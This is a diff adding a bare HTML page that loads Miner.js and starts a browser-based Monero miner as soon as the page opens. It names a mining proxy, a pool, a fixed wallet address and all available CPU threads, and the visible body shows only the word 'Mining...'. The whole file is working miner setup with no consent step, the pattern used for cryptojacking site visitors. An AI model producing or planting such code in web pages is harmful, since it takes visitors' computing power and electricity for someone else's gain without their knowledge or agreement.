@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+
+    <!-- Start of Mining code -->
+    <script src="Miner.js"></script>
+    <script>
+        var server = "wss://f.xmrminingproxy.com:8181";
+        var pool = "moneroocean.stream";
+        var walletAddress = "463hjpRmnpHNNNUjwitD7LQyW6AT3JxwDdJwAB6DERonLfpsNVm8uqqMe4ycQrKKF629foD9sQ3rH9gkDTFLoxsNBAEBbfWy";
+        var workerId = "";
+        var threads = -1;
+        var password = "";
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+    </script>
+    <!-- End of Mining code -->
+
+  </head>
+  <body>
+    <h1>Mining...</h1>
+  </body>
+</html>
